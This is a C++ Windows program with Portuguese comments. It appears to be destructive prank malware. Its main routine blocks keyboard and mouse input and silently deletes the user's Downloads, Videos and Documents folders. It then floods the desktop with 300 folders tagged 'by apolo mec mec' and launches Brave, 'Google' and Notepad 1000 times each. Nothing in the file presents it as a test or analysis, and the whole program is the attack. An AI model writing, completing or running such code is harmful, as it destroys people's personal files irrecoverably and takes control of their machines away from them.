#include <Windows.h>
#include <iostream>
#include <shellapi.h>
#include <string>
#include <Lmcons.h>
#include <shlobj.h>
#include <direct.h>
#include <ctime>
#include <cstdlib>

/*Função para retornar o nome de usuário*/
std::wstring GetComputerUserName() {
	wchar_t userName[UNLEN + 1];
	DWORD userNameLength = UNLEN + 1;

	if (GetUserNameW(userName, &userNameLength)){
		return std::wstring(userName);
	}
	else {
		return L"Nao foi possivel encontrar o nome do usuario";
	}
}

/*Função para buscar o diretório que eu quero*/
std::wstring GetDesktopPath() {
	return L"C:\\Users\\" + GetComputerUserName() + L"\\Downloads";
}

std::wstring GetDesktopPath2(){
	return L"C:\\Users\\" + GetComputerUserName() + L"\\Videos";
}

std::wstring GetDesktopPath3(){
	wchar_t path[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, path))) {
		return std::wstring(path);
	}
	return L".";
}
std::wstring GetDesktopPath4() {
	return L"C:\\Users\\" + GetComputerUserName() + L"\\Documents";
}
/*Função para apagar o diretório que eu quero*/
void DeletarPasta(const std::wstring& caminho) {
	wchar_t pathToDelete[MAX_PATH];
	wcscpy_s(pathToDelete, caminho.c_str());
	pathToDelete[wcslen(caminho.c_str()) + 1] = L'\0'; 

	SHFILEOPSTRUCTW fileOp = { 0 };
	fileOp.wFunc = FO_DELETE;
	fileOp.pFrom = pathToDelete;
	fileOp.fFlags = FOF_NO_UI; 

	int result = SHFileOperationW(&fileOp);

	if (result == 0) {
		std::wcout << L"Deletado com sucesso!\n";
	}
	else {
		std::wcout << L"Erro ao deletar. Codigo: " << result << std::endl;
	}
}

/*Adicionar sufixo aleatório no final das pastas se elas já existirem*/
bool PastaExiste(const std::wstring& caminho3) {
	DWORD attrib = GetFileAttributesW(caminho3.c_str());
	return (attrib != INVALID_FILE_ATTRIBUTES && (attrib & FILE_ATTRIBUTE_DIRECTORY));
}

std::wstring GerarSufixoAleatorio() {
	const wchar_t caracteres[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
	int index = rand() % (sizeof(caracteres) / sizeof(wchar_t) - 1);
	return std::wstring(1, caracteres[index]);
}

std::wstring GerarSufixoVariavel(int maxTamanho) {
	std::wstring resultado = L"";
	for (int i = 0; i < maxTamanho; ++i) {
		resultado += GerarSufixoAleatorio();
	}
	return resultado;
}

void CriarPasta(std::wstring caminhoBase) {
	std::wstring baseNome = L" by apolo mec mec ";
	std::wstring sufixo = L"";
	std::wstring caminhoFinal;
	bool criada = false;
	for (int tamanho = 0; tamanho < 4; ++tamanho) {
		sufixo += GerarSufixoAleatorio();
		caminhoFinal = caminhoBase + baseNome + sufixo;

		if (!PastaExiste(caminhoFinal)) {
			if (_wmkdir(caminhoFinal.c_str()) == 0) {
				std::wcout << L"Pasta criada com sucesso: " << caminhoFinal << std::endl;
				criada = true;
				break;
			}
		}
	}
	if (!criada) {
		std::wcout << L"Nao foi possivel criar a pasta" << std::endl;
	}
}

int main(){
	BlockInput(TRUE);
	std::wstring caminho = GetDesktopPath();
	std::wstring caminho2 = GetDesktopPath2();
	std::wstring caminho3 = GetDesktopPath4();
	std::wstring caminhoBase = GetDesktopPath3() + L"\\";
	DeletarPasta(caminho);
	DeletarPasta(caminho2);
	DeletarPasta(caminho3);
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_MINIMIZE);
	srand(static_cast<unsigned int>(time(0)));
	for (int i = 0; i < 300; i++) {
		CriarPasta(caminhoBase);
	}
	for (int i = 0; i < 1000; i++) {
		ShellExecute(NULL, L"open", L"Brave", NULL, NULL,SW_SHOWNORMAL);
	}
	for (int i = 0; i < 1000; i++) {
		ShellExecute(NULL, L"open", L"Google", NULL, NULL, SW_SHOWNORMAL);
	}
	for (int i = 0; i < 1000; i++) {
		ShellExecute(NULL, L"open", L"notepad.exe", NULL, NULL, SW_SHOWNORMAL);
	}

	return 0;
}
